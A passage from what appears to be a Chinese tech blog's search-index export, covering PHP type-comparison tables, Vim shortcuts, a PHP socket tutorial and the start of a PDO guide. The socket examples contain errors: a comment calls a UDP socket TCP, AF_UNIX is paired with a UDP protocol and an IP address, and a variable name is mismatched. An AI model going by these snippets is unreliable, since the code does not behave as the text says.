align="left"><strong><code>TRUE</code></strong></td></tr><tr><td align="left"><code>$x = 1;</code></td><td align="left"><a href="https://www.php.net/manual/zh/language.types.integer.php" target="_blank" rel="noopener">integer</a></td><td align="left"><strong><code>FALSE</code></strong></td><td align="left"><strong><code>FALSE</code></strong></td><td align="left"><strong><code>TRUE</code></strong></td><td align="left"><strong><code>TRUE</code></strong></td></tr><tr><td align="left"><code>$x = 42;</code></td><td align="left"><a href="https://www.php.net/manual/zh/language.types.integer.php" target="_blank" rel="noopener">integer</a></td><td align="left"><strong><code>FALSE</code></strong></td><td align="left"><strong><code>FALSE</code></strong></td><td align="left"><strong><code>TRUE</code></strong></td><td align="left"><strong><code>TRUE</code></strong></td></tr><tr><td align="left"><code>$x = 0;</code></td><td align="left"><a href="https://www.php.net/manual/zh/language.types.integer.php" target="_blank" rel="noopener">integer</a></td><td align="left"><strong><code>TRUE</code></strong></td><td align="left"><strong><code>FALSE</code></strong></td><td align="left"><strong><code>TRUE</code></strong></td><td align="left"><strong><code>FALSE</code></strong></td></tr><tr><td align="left"><code>$x = -1;</code></td><td align="left"><a href="https://www.php.net/manual/zh/language.types.integer.php" target="_blank" rel="noopener">integer</a></td><td align="left"><strong><code>FALSE</code></strong></td><td align="left"><strong><code>FALSE</code></strong></td><td align="left"><strong><code>TRUE</code></strong></td><td align="left"><strong><code>TRUE</code></strong></td></tr><tr><td align="left"><code>$x = &quot;1&quot;;</code></td><td align="left"><a href="https://www.php.net/manual/zh/language.types.string.php" target="_blank" rel="noopener">string</a></td><td align="left"><strong><code>FALSE</code></strong></td><td align="left"><strong><code>FALSE</code></strong></td><td align="left"><strong><code>TRUE</code></strong></td><td align="left"><strong><code>TRUE</code></strong></td></tr><tr><td align="left"><code>$x = &quot;0&quot;;</code></td><td align="left"><a href="https://www.php.net/manual/zh/language.types.string.php" target="_blank" rel="noopener">string</a></td><td align="left"><strong><code>TRUE</code></strong></td><td align="left"><strong><code>FALSE</code></strong></td><td align="left"><strong><code>TRUE</code></strong></td><td align="left"><strong><code>FALSE</code></strong></td></tr><tr><td align="left"><code>$x = &quot;-1&quot;;</code></td><td align="left"><a href="https://www.php.net/manual/zh/language.types.string.php" target="_blank" rel="noopener">string</a></td><td align="left"><strong><code>FALSE</code></strong></td><td align="left"><strong><code>FALSE</code></strong></td><td align="left"><strong><code>TRUE</code></strong></td><td align="left"><strong><code>TRUE</code></strong></td></tr><tr><td align="left"><code>$x = &quot;php&quot;;</code></td><td align="left"><a href="https://www.php.net/manual/zh/language.types.string.php" target="_blank" rel="noopener">string</a></td><td align="left"><strong><code>FALSE</code></strong></td><td align="left"><strong><code>FALSE</code></strong></td><td align="left"><strong><code>TRUE</code></strong></td><td align="left"><strong><code>TRUE</code></strong></td></tr><tr><td align="left"><code>$x = &quot;true&quot;;</code></td><td align="left"><a href="https://www.php.net/manual/zh/language.types.string.php" target="_blank" rel="noopener">string</a></td><td align="left"><strong><code>FALSE</code></strong></td><td align="left"><strong><code>FALSE</code></strong></td><td align="left"><strong><code>TRUE</code></strong></td><td align="left"><strong><code>TRUE</code></strong></td></tr><tr><td align="left"><code>$x = &quot;false&quot;;</code></td><td align="left"><a href="https://www.php.net/manual/zh/language.types.string.php" target="_blank" rel="noopener">string</a></td><td align="left"><strong><code>FALSE</code></strong></td><td align="left"><strong><code>FALSE</code></strong></td><td align="left"><strong><code>TRUE</code></strong></td><td align="left"><strong><code>TRUE</code></strong></td></tr></tbody></table><h3 id="松散判断"><a href="#松散判断" class="headerlink" title="松散判断 =="></a>松散判断 ==</h3><table><thead><tr><th align="left"></th><th align="left"><strong><code>TRUE</code></strong></th><th align="left"><strong><code>FALSE</code></strong></th><th align="left"><code>1</code></th><th align="left"><code>0</code></th><th align="left"><code>-1</code></th><th align="left"><code>&quot;1&quot;</code></th><th align="left"><code>&quot;0&quot;</code></th><th align="left"><code>&quot;-1&quot;</code></th><th align="left"><strong><code>NULL</code></strong></th><th align="left"><code>array()</code></th><th align="left"><code>&quot;php&quot;</code></th><th><code>&quot;&quot;</code></th></tr></thead><tbody><tr><td align="left"><strong><code>TRUE</code></strong></td><td align="left"><strong><code>TRUE</code></strong></td><td align="left"><strong><code>FALSE</code></strong></td><td align="left"><strong><code>TRUE</code></strong></td><td align="left"><strong><code>FALSE</code></strong></td><td align="left"><strong><code>TRUE</code></strong></td><td align="left"><strong><code>TRUE</code></strong></td><td align="left"><strong><code>FALSE</code></strong></td><td align="left"><strong><code>TRUE</code></strong></td><td align="left"><strong><code>FALSE</code></strong></td><td align="left"><strong><code>FALSE</code></strong></td><td align="left"><strong><code>TRUE</code></strong></td><td><strong><code>FALSE</code></strong></td></tr><tr><td align="left"><strong><code>FALSE</code></strong></td><td align="left"><strong><code>FALSE</code></strong></td><td align="left"><strong><code>TRUE</code></strong></td><td align="left"><strong><code>FALSE</code></strong></td><td align="left"><strong><code>TRUE</code></strong></td><td align="left"><strong><code>FALSE</code></strong></td><td align="left"><strong><code>FALSE</code></strong></td><td align="left"><strong><code>TRUE</code></strong></td><td align="left"><strong><code>FALSE</code></strong></td><td align="left"><strong><code>TRUE</code></strong></td><td align="left"><strong><code>TRUE</code></strong></td><td align="left"><strong><code>FALSE</code></strong></td><td><strong><code>TRUE</code></strong></td></tr><tr><td align="left"><code>1</code></td><td align="left"><strong><code>TRUE</code></strong></td><td align="left"><strong><code>FALSE</code></strong></td><td align="left"><strong><code>TRUE</code></strong></td><td align="left"><strong><code>FALSE</code></strong></td><td align="left"><strong><code>FALSE</code></strong></td><td align="left"><strong><code>TRUE</code></strong></td><td align="left"><strong><code>FALSE</code></strong></td><td align="left"><strong><code>FALSE</code></strong></td><td align="left"><strong><code>FALSE</code></strong></td><td align="left"><strong><code>FALSE</code></strong></td><td align="left"><strong><code>FALSE</code></strong></td><td><strong><code>FALSE</code></strong></td></tr><tr><td align="left"><code>0</code></td><td align="left"><strong><code>FALSE</code></strong></td><td align="left"><strong><code>TRUE</code></strong></td><td align="left"><strong><code>FALSE</code></strong></td><td align="left"><strong><code>TRUE</code></strong></td><td align="left"><strong><code>FALSE</code></strong></td><td align="left"><strong><code>FALSE</code></strong></td><td align="left"><strong><code>TRUE</code></strong></td><td align="left"><strong><code>FALSE</code></strong></td><td align="left"><strong><code>TRUE</code></strong></td><td align="left"><strong><code>FALSE</code></strong></td><td align="left"><strong><code>TRUE</code></strong></td><td><strong><code>TRUE</code></strong></td></tr><tr><td align="left"><code>-1</code></td><td align="left"><strong><code>TRUE</code></strong></td><td align="left"><strong><code>FALSE</code></strong></td><td align="left"><strong><code>FALSE</code></strong></td><td align="left"><strong><code>FALSE</code></strong></td><td align="left"><strong><code>TRUE</code></strong></td><td align="left"><strong><code>FALSE</code></strong></td><td align="left"><strong><code>FALSE</code></strong></td><td align="left"><strong><code>TRUE</code></strong></td><td align="left"><strong><code>FALSE</code></strong></td><td align="left"><strong><code>FALSE</code></strong></td><td align="left"><strong><code>FALSE</code></strong></td><td><strong><code>FALSE</code></strong></td></tr><tr><td align="left"><code>&quot;1&quot;</code></td><td align="left"><strong><code>TRUE</code></strong></td><td align="left"><strong><code>FALSE</code></strong></td><td align="left"><strong><code>TRUE</code></strong></td><td align="left"><strong><code>FALSE</code></strong></td><td align="left"><strong><code>FALSE</code></strong></td><td align="left"><strong><code>TRUE</code></strong></td><td align="left"><strong><code>FALSE</code></strong></td><td align="left"><strong><code>FALSE</code></strong></td><td align="left"><strong><code>FALSE</code></strong></td><td align="left"><strong><code>FALSE</code></strong></td><td align="left"><strong><code>FALSE</code></strong></td><td><strong><code>FALSE</code></strong></td></tr><tr><td align="left"><code>&quot;0&quot;</code></td><td align="left"><strong><code>FALSE</code></strong></td><td align="left"><strong><code>TRUE</code></strong></td><td align="left"><strong><code>FALSE</code></strong></td><td align="left"><strong><code>TRUE</code></strong></td><td align="left"><strong><code>FALSE</code></strong></td><td align="left"><strong><code>FALSE</code></strong></td><td align="left"><strong><code>TRUE</code></strong></td><td align="left"><strong><code>FALSE</code></strong></td><td align="left"><strong><code>FALSE</code></strong></td><td align="left"><strong><code>FALSE</code></strong></td><td align="left"><strong><code>FALSE</code></strong></td><td><strong><code>FALSE</code></strong></td></tr><tr><td align="left"><code>&quot;-1&quot;</code></td><td align="left"><strong><code>TRUE</code></strong></td><td align="left"><strong><code>FALSE</code></strong></td><td align="left"><strong><code>FALSE</code></strong></td><td align="left"><strong><code>FALSE</code></strong></td><td align="left"><strong><code>TRUE</code></strong></td><td align="left"><strong><code>FALSE</code></strong></td><td align="left"><strong><code>FALSE</code></strong></td><td align="left"><strong><code>TRUE</code></strong></td><td align="left"><strong><code>FALSE</code></strong></td><td align="left"><strong><code>FALSE</code></strong></td><td align="left"><strong><code>FALSE</code></strong></td><td><strong><code>FALSE</code></strong></td></tr><tr><td align="left"><strong><code>NULL</code></strong></td><td align="left"><strong><code>FALSE</code></strong></td><td align="left"><strong><code>TRUE</code></strong></td><td align="left"><strong><code>FALSE</code></strong></td><td align="left"><strong><code>TRUE</code></strong></td><td align="left"><strong><code>FALSE</code></strong></td><td align="left"><strong><code>FALSE</code></strong></td><td align="left"><strong><code>FALSE</code></strong></td><td align="left"><strong><code>FALSE</code></strong></td><td align="left"><strong><code>TRUE</code></strong></td><td align="left"><strong><code>TRUE</code></strong></td><td align="left"><strong><code>FALSE</code></strong></td><td><strong><code>TRUE</code></strong></td></tr><tr><td align="left"><code>array()</code></td><td align="left"><strong><code>FALSE</code></strong></td><td align="left"><strong><code>TRUE</code></strong></td><td align="left"><strong><code>FALSE</code></strong></td><td align="left"><strong><code>FALSE</code></strong></td><td align="left"><strong><code>FALSE</code></strong></td><td align="left"><strong><code>FALSE</code></strong></td><td align="left"><strong><code>FALSE</code></strong></td><td align="left"><strong><code>FALSE</code></strong></td><td align="left"><strong><code>TRUE</code></strong></td><td align="left"><strong><code>TRUE</code></strong></td><td align="left"><strong><code>FALSE</code></strong></td><td><strong><code>FALSE</code></strong></td></tr><tr><td align="left"><code>&quot;php&quot;</code></td><td align="left"><strong><code>TRUE</code></strong></td><td align="left"><strong><code>FALSE</code></strong></td><td align="left"><strong><code>FALSE</code></strong></td><td align="left"><strong><code>TRUE</code></strong></td><td align="left"><strong><code>FALSE</code></strong></td><td align="left"><strong><code>FALSE</code></strong></td><td align="left"><strong><code>FALSE</code></strong></td><td align="left"><strong><code>FALSE</code></strong></td><td align="left"><strong><code>FALSE</code></strong></td><td align="left"><strong><code>FALSE</code></strong></td><td align="left"><strong><code>TRUE</code></strong></td><td><strong><code>FALSE</code></strong></td></tr><tr><td align="left"><code>&quot;&quot;</code></td><td align="left"><strong><code>FALSE</code></strong></td><td align="left"><strong><code>TRUE</code></strong></td><td align="left"><strong><code>FALSE</code></strong></td><td align="left"><strong><code>TRUE</code></strong></td><td align="left"><strong><code>FALSE</code></strong></td><td align="left"><strong><code>FALSE</code></strong></td><td align="left"><strong><code>FALSE</code></strong></td><td align="left"><strong><code>FALSE</code></strong></td><td align="left"><strong><code>TRUE</code></strong></td><td align="left"><strong><code>FALSE</code></strong></td><td align="left"><strong><code>FALSE</code></strong></td><td><strong><code>TRUE</code></strong></td></tr></tbody></table><h3 id="严格比较"><a href="#严格比较" class="headerlink" title="严格比较 ==="></a>严格比较 ===</h3><table><thead><tr><th align="left"></th><th align="left"><strong><code>TRUE</code></strong></th><th align="left"><strong><code>FALSE</code></strong></th><th align="left"><code>1</code></th><th align="left"><code>0</code></th><th align="left"><code>-1</code></th><th align="left"><code>&quot;1&quot;</code></th><th align="left"><code>&quot;0&quot;</code></th><th align="left"><code>&quot;-1&quot;</code></th><th align="left"><strong><code>NULL</code></strong></th><th align="left"><code>array()</code></th><th align="left"><code>&quot;php&quot;</code></th><th><code>&quot;&quot;</code></th></tr></thead><tbody><tr><td align="left"><strong><code>TRUE</code></strong></td><td align="left"><strong><code>TRUE</code></strong></td><td align="left"><strong><code>FALSE</code></strong></td><td align="left"><strong><code>FALSE</code></strong></td><td align="left"><strong><code>FALSE</code></strong></td><td align="left"><strong><code>FALSE</code></strong></td><td align="left"><strong><code>FALSE</code></strong></td><td align="left"><strong><code>FALSE</code></strong></td><td align="left"><strong><code>FALSE</code></strong></td><td align="left"><strong><code>FALSE</code></strong></td><td align="left"><strong><code>FALSE</code></strong></td><td align="left"><strong><code>FALSE</code></strong></td><td><strong><code>FALSE</code></strong></td></tr><tr><td align="left"><strong><code>FALSE</code></strong></td><td align="left"><strong><code>FALSE</code></strong></td><td align="left"><strong><code>TRUE</code></strong></td><td align="left"><strong><code>FALSE</code></strong></td><td align="left"><strong><code>FALSE</code></strong></td><td align="left"><strong><code>FALSE</code></strong></td><td align="left"><strong><code>FALSE</code></strong></td><td align="left"><strong><code>FALSE</code></strong></td><td align="left"><strong><code>FALSE</code></strong></td><td align="left"><strong><code>FALSE</code></strong></td><td align="left"><strong><code>FALSE</code></strong></td><td align="left"><strong><code>FALSE</code></strong></td><td><strong><code>FALSE</code></strong></td></tr><tr><td align="left"><code>1</code></td><td align="left"><strong><code>FALSE</code></strong></td><td align="left"><strong><code>FALSE</code></strong></td><td align="left"><strong><code>TRUE</code></strong></td><td align="left"><strong><code>FALSE</code></strong></td><td align="left"><strong><code>FALSE</code></strong></td><td align="left"><strong><code>FALSE</code></strong></td><td align="left"><strong><code>FALSE</code></strong></td><td align="left"><strong><code>FALSE</code></strong></td><td align="left"><strong><code>FALSE</code></strong></td><td align="left"><strong><code>FALSE</code></strong></td><td align="left"><strong><code>FALSE</code></strong></td><td><strong><code>FALSE</code></strong></td></tr><tr><td align="left"><code>0</code></td><td align="left"><strong><code>FALSE</code></strong></td><td align="left"><strong><code>FALSE</code></strong></td><td align="left"><strong><code>FALSE</code></strong></td><td align="left"><strong><code>TRUE</code></strong></td><td align="left"><strong><code>FALSE</code></strong></td><td align="left"><strong><code>FALSE</code></strong></td><td align="left"><strong><code>FALSE</code></strong></td><td align="left"><strong><code>FALSE</code></strong></td><td align="left"><strong><code>FALSE</code></strong></td><td align="left"><strong><code>FALSE</code></strong></td><td align="left"><strong><code>FALSE</code></strong></td><td><strong><code>FALSE</code></strong></td></tr><tr><td align="left"><code>-1</code></td><td align="left"><strong><code>FALSE</code></strong></td><td align="left"><strong><code>FALSE</code></strong></td><td align="left"><strong><code>FALSE</code></strong></td><td align="left"><strong><code>FALSE</code></strong></td><td align="left"><strong><code>TRUE</code></strong></td><td align="left"><strong><code>FALSE</code></strong></td><td align="left"><strong><code>FALSE</code></strong></td><td align="left"><strong><code>FALSE</code></strong></td><td align="left"><strong><code>FALSE</code></strong></td><td align="left"><strong><code>FALSE</code></strong></td><td align="left"><strong><code>FALSE</code></strong></td><td><strong><code>FALSE</code></strong></td></tr><tr><td align="left"><code>&quot;1&quot;</code></td><td align="left"><strong><code>FALSE</code></strong></td><td align="left"><strong><code>FALSE</code></strong></td><td align="left"><strong><code>FALSE</code></strong></td><td align="left"><strong><code>FALSE</code></strong></td><td align="left"><strong><code>FALSE</code></strong></td><td align="left"><strong><code>TRUE</code></strong></td><td align="left"><strong><code>FALSE</code></strong></td><td align="left"><strong><code>FALSE</code></strong></td><td align="left"><strong><code>FALSE</code></strong></td><td align="left"><strong><code>FALSE</code></strong></td><td align="left"><strong><code>FALSE</code></strong></td><td><strong><code>FALSE</code></strong></td></tr><tr><td align="left"><code>&quot;0&quot;</code></td><td align="left"><strong><code>FALSE</code></strong></td><td align="left"><strong><code>FALSE</code></strong></td><td align="left"><strong><code>FALSE</code></strong></td><td align="left"><strong><code>FALSE</code></strong></td><td align="left"><strong><code>FALSE</code></strong></td><td align="left"><strong><code>FALSE</code></strong></td><td align="left"><strong><code>TRUE</code></strong></td><td align="left"><strong><code>FALSE</code></strong></td><td align="left"><strong><code>FALSE</code></strong></td><td align="left"><strong><code>FALSE</code></strong></td><td align="left"><strong><code>FALSE</code></strong></td><td><strong><code>FALSE</code></strong></td></tr><tr><td align="left"><code>&quot;-1&quot;</code></td><td align="left"><strong><code>FALSE</code></strong></td><td align="left"><strong><code>FALSE</code></strong></td><td align="left"><strong><code>FALSE</code></strong></td><td align="left"><strong><code>FALSE</code></strong></td><td align="left"><strong><code>FALSE</code></strong></td><td align="left"><strong><code>FALSE</code></strong></td><td align="left"><strong><code>FALSE</code></strong></td><td align="left"><strong><code>TRUE</code></strong></td><td align="left"><strong><code>FALSE</code></strong></td><td align="left"><strong><code>FALSE</code></strong></td><td align="left"><strong><code>FALSE</code></strong></td><td><strong><code>FALSE</code></strong></td></tr><tr><td align="left"><strong><code>NULL</code></strong></td><td align="left"><strong><code>FALSE</code></strong></td><td align="left"><strong><code>FALSE</code></strong></td><td align="left"><strong><code>FALSE</code></strong></td><td align="left"><strong><code>FALSE</code></strong></td><td align="left"><strong><code>FALSE</code></strong></td><td align="left"><strong><code>FALSE</code></strong></td><td align="left"><strong><code>FALSE</code></strong></td><td align="left"><strong><code>FALSE</code></strong></td><td align="left"><strong><code>TRUE</code></strong></td><td align="left"><strong><code>FALSE</code></strong></td><td align="left"><strong><code>FALSE</code></strong></td><td><strong><code>FALSE</code></strong></td></tr><tr><td align="left"><code>array()</code></td><td align="left"><strong><code>FALSE</code></strong></td><td align="left"><strong><code>FALSE</code></strong></td><td align="left"><strong><code>FALSE</code></strong></td><td align="left"><strong><code>FALSE</code></strong></td><td align="left"><strong><code>FALSE</code></strong></td><td align="left"><strong><code>FALSE</code></strong></td><td align="left"><strong><code>FALSE</code></strong></td><td align="left"><strong><code>FALSE</code></strong></td><td align="left"><strong><code>FALSE</code></strong></td><td align="left"><strong><code>TRUE</code></strong></td><td align="left"><strong><code>FALSE</code></strong></td><td><strong><code>FALSE</code></strong></td></tr><tr><td align="left"><code>&quot;php&quot;</code></td><td align="left"><strong><code>FALSE</code></strong></td><td align="left"><strong><code>FALSE</code></strong></td><td align="left"><strong><code>FALSE</code></strong></td><td align="left"><strong><code>FALSE</code></strong></td><td align="left"><strong><code>FALSE</code></strong></td><td align="left"><strong><code>FALSE</code></strong></td><td align="left"><strong><code>FALSE</code></strong></td><td align="left"><strong><code>FALSE</code></strong></td><td align="left"><strong><code>FALSE</code></strong></td><td align="left"><strong><code>FALSE</code></strong></td><td align="left"><strong><code>TRUE</code></strong></td><td><strong><code>FALSE</code></strong></td></tr><tr><td align="left"><code>&quot;&quot;</code></td><td align="left"><strong><code>FALSE</code></strong></td><td align="left"><strong><code>FALSE</code></strong></td><td align="left"><strong><code>FALSE</code></strong></td><td align="left"><strong><code>FALSE</code></strong></td><td align="left"><strong><code>FALSE</code></strong></td><td align="left"><strong><code>FALSE</code></strong></td><td align="left"><strong><code>FALSE</code></strong></td><td align="left"><strong><code>FALSE</code></strong></td><td align="left"><strong><code>FALSE</code></strong></td><td align="left"><strong><code>FALSE</code></strong></td><td align="left"><strong><code>FALSE</code></strong></td><td><strong><code>TRUE</code></strong></td></tr></tbody></table><h3 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h3><p><a href="https://www.php.net/manual/zh/types.comparisons.php" target="_blank" rel="noopener">PHP 类型比较表</a></p>]]></content>
      
      
      <categories>
          
          <category> PHP </category>
          
      </categories>
      
      
        <tags>
            
            <tag> PHP </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Vim 常用快捷键总结</title>
      <link href="/summary-of-vim-commonly-used-shortcut-keys/"/>
      <url>/summary-of-vim-commonly-used-shortcut-keys/</url>
      
        <content type="html"><![CDATA[<p>Vim 是我在Linux 下比较常用的文本编辑器，这里整理一下常用的操作。</p><a id="more"></a><h3 id="基本操作"><a href="#基本操作" class="headerlink" title="基本操作"></a>基本操作</h3><ul><li>移动到行首：<code>0</code></li><li>移动到行尾：<code>$</code></li><li>光标移动到文件开始位置：<code>gg</code></li><li>光标移动到文件结束位置: <code>shift + g</code></li><li>删除所有内容：<code>ggdG</code></li><li>单行删除：<code>dd</code></li><li>单行复制：<code>yy</code></li><li>粘贴：<code>p</code></li><li>复制全部内容：<code>ggyG</code></li></ul><h3 id="移动到指定行"><a href="#移动到指定行" class="headerlink" title="移动到指定行"></a>移动到指定行</h3><p>在vim 中直接移动到指定行数，有三种方式（均是在命令行模式下输入，n 为指定的行号）：</p><ol><li>ngg/ nG</li><li>:n</li><li>vim +n filename</li></ol><h3 id="进阶操作"><a href="#进阶操作" class="headerlink" title="进阶操作"></a>进阶操作</h3><p>当前行替换：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">s&#x2F;XXX&#x2F;YYY&#x2F;g</span><br></pre></td></tr></table></figure><p>其中XXX 是需要替换的字符串，YYY是替换后的字符串。</p><p>全局替换：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">%s&#x2F;XXX&#x2F;YYY&#x2F;g</span><br></pre></td></tr></table></figure><h3 id="一些配置"><a href="#一些配置" class="headerlink" title="一些配置"></a>一些配置</h3><ul><li>查找字符设置高亮：<code>set hlsearch</code></li><li>显示行号：<code>set number</code></li></ul>]]></content>
      
      
      <categories>
          
          <category> Linux </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Linux </tag>
            
            <tag> Vim </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>PHP Socket 编程</title>
      <link href="/php-socket-programming/"/>
      <url>/php-socket-programming/</url>
      
        <content type="html"><![CDATA[<p>最近因为一些原因接触到一个老古董项目，这个项目虽然有些老，但仔细看一看，还是能学到一些东西的。</p><p>关于 PHP Socket 编程的文章有很多，这里就只简单记录一下如何快速上手。</p><a id="more"></a><h2 id="什么是-Socket"><a href="#什么是-Socket" class="headerlink" title="什么是 Socket"></a>什么是 Socket</h2><p>按照惯例，还是先来了解一下基本概念。</p><p>我们知道两个进程如果需要进程通讯，最基本的前提就是保证彼此进程的唯一，并能确定彼此身份。在本地进程通讯中我们可以使用 PID 来标示唯一的进程，但 PID 只在本地唯一，网络中的两个进程 PID 冲突的几率很大，这时候我们就需要另辟蹊径了。</p><p>我们知道IP 层的IP 地址可以唯一标示主机，而TCP 层协议和端口号可以唯一标示主机的一个进程，这样我们就可以利用 IP 地址+ 协议 + 端口号唯一标示网络中的一个进程。</p><p>能够唯一标示网络中的进程后，它们就可以利用socket 进行通信了。</p><blockquote><p>什么是socket？</p></blockquote><p>我们经常把 socket 翻译成套接字，<strong>socket 是在应用层和传输层之间的一个抽象层，它把 TCP/IP 层复杂的操作抽象为几个简单的接口供应用层调用以实现进程在网络中通信</strong>。</p><p><img src="https://cdn.jsdelivr.net/gh/0xAiKang/CDN/blog/images/20201015094303.png" alt=""></p><p>socket 起源于 UNIX，在UNIX 一切皆为文件哲学的思想下，socket 是一种“打开=&gt;读/写=&gt;关闭“模式的实现，服务器和客户端各自维护一个文件，在建立连接打开之后，可以向自己的文件写入内容供对方读取或者读取对方内容，通讯结束时关闭文件。</p><h3 id="socket-通信流程"><a href="#socket-通信流程" class="headerlink" title="socket 通信流程"></a>socket 通信流程</h3><p>socket 是”打开=&gt;读/写=&gt;关闭”模式的实现，以使用TCP协议通讯的socket为例，其交互流程大概是这样子：</p><p><img src="https://cdn.jsdelivr.net/gh/0xAiKang/CDN/blog/images/20201015094756.png" alt=""></p><h2 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h2><p>PHP 默认没有启用 sockets 扩展，所以需要手动安装扩展。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">apt-get install php7.2-sockets</span><br></pre></td></tr></table></figure><p><code>php -m</code> 或者 <code>php -i</code>检查扩展是否已经启用。</p><h3 id="创建连接"><a href="#创建连接" class="headerlink" title="创建连接"></a>创建连接</h3><p>创建并返回一个套接字，也称作一个通讯节点。一个典型的网络连接由 2 个套接字构成，一个运行在客户端，另一个运行在服务端。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"># 创建一个TCP 协议的 socket</span><br><span class="line">$socket &#x3D; socket_create(AF_INET, SOCK_DGRAM, SOL_UDP);</span><br><span class="line"></span><br><span class="line"># 创建一个本地的socket</span><br><span class="line">$socket &#x3D; socket_create(AF_UNIX, SOCK_STREAM, 0);</span><br></pre></td></tr></table></figure><p><code>socket_create</code>函数接收三个参数，分别是domain、type、protocol。 </p><ul><li>domain：当前套接字使用什么协议</li><li>type：当前套接字的类型</li><li>protocol：设置指定 domain 套接字下的具体协议</li></ul><h3 id="发送内容"><a href="#发送内容" class="headerlink" title="发送内容"></a>发送内容</h3><p>发送数据有两种方式：</p><ol><li>socket_send：发送消息至已连接的客户端。</li><li>socket_sendto：发送消息至客户端，无论是否连接。<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$sock &#x3D; socket_create(AF_UNIX, SOCK_DGRAM, SOL_UDP);</span><br><span class="line"></span><br><span class="line">$msg &#x3D; &quot;Ping !&quot;;</span><br><span class="line">$len &#x3D; strlen($msg);</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; 向本地 1223 端口发送内容</span><br><span class="line">socket_sendto($sock, $msg, $len, 0, &#39;127.0.0.1&#39;, 1223);</span><br><span class="line">socket_close($sock);</span><br></pre></td></tr></table></figure></li></ol><h3 id="接收数据"><a href="#接收数据" class="headerlink" title="接收数据"></a>接收数据</h3><p>接收数据也有两种方式：</p><ol><li>socket_recv：从已连接的socket 接收数据</li><li>socket_recvfrom：从socket 接收数据，无论是否连接</li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$sock &#x3D; socket_create(AF_UNIX, SOCK_DGRAM, SOL_UDP);</span><br><span class="line"></span><br><span class="line"># 从本地 1223 端口获取内容</span><br><span class="line">socket_recvfrom($socket, $buf, 1024, 0, &quot;127.0.0.1&quot;, 1223);</span><br><span class="line">var_dump($buf); &#x2F;&#x2F; Ping !</span><br></pre></td></tr></table></figure><h3 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h3><ul><li><a href="https://www.cnblogs.com/dolphinx/p/3460545.html" target="_blank" rel="noopener">简单理解Socket</a></li><li><a href="https://segmentfault.com/a/1190000014044351" target="_blank" rel="noopener">一篇搞懂TCP、HTTP、Socket、Socket连接池</a></li><li><a href="https://www.php.net/manual/zh/function.socket-create.php" target="_blank" rel="noopener">socket_create</a></li><li><a href="https://www.php.net/manual/zh/function.socket-sendto.php" target="_blank" rel="noopener">socket_sendto</a></li><li><a href="https://www.php.net/manual/zh/function.socket-bind.php" target="_blank" rel="noopener">socket_bind</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> PHP </category>
          
      </categories>
      
      
        <tags>
            
            <tag> PHP </tag>
            
            <tag> Socket </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>PHP PDO 快速上手</title>
      <link href="/php-pdo-quick-start/"/>
      <url>/php-pdo-quick-start/</url>
      
        <content type="html"><![CDATA[<p>最近用到了 <code>PHP PDO</code>相关的知识，整理总结一下。</p><a id="more"></a><h2 id="PDO-是什么？"><a href="#PDO-是什么？" class="headerlink" title="PDO 是什么？"></a>PDO 是什么？</h2><p>PDO（PHP Data Object）</p><p>PHP 数据对象 （PDO） 扩展为PHP访问数据库定义了一个轻量级的一致接口。</p><h2 id="PDO-能做什么？"><a href="#PDO-能做什么？" class="headerlink" title="PDO 能做什么？"></a>PDO 能做什么？</h2><p>PDO 提供了一个数据访问抽象层，这意味着，不管使用哪种数据库，都可以用相同的函数（方法）来查询和获取数据。</p><p>在 PHP 使用 MySQL 数据库前，你需要先将它们连接。</p><p>PHP 5 及以上版本有两种方式连接 MySQL :</p><ul><li>MySQLi extension (“i” 意为 improved)</li><li>PDO (PHP Data Objects)</li></ul><blockquote><p>关于是选择 Mysqli，还是 PDO？</p></blockquote><p>MySQLi 和 PDO 有它们自己的优势：PDO 应用在 12 种不同数据库中， MySQLi 只针对 MySQL 数据库。</p><p>如果项目需要在多种数据库中切换，建议使用 PDO，因为只需要修改连接字符串和部分查询语句即可。</p><h3 id="PDO-安装"><a href="#PDO-安装" class="headerlink" title="PDO 安装"></a>PDO 安装</h3><p>在 PHP5 系列版本中，PDO不是默认支持的，需要手工配置才可以使用。打开 php.ini 文件，开启扩展。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F; php.ini</span><br><span class="line">extension&#x3D;php_pdo.dll</span><br><span class="line">extension&#x3D;php_pdo_mysql.dll</span><br></pre></td></tr></table></figure><p>上述配置只打开了对 MySQL 的 PDO 支持，如果需要对别的数据库类型进行支持，可以分别打开对应的不同配置（去掉前面的分号）：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">;extension&#x3D;php_pdo_oci.dll</span><br><span class="line">;extension&#x3D;php_pdo_oci8.dll</span><br><span class="line">;extension&#x3D;php_pdo_odbc.dll</span><br><span 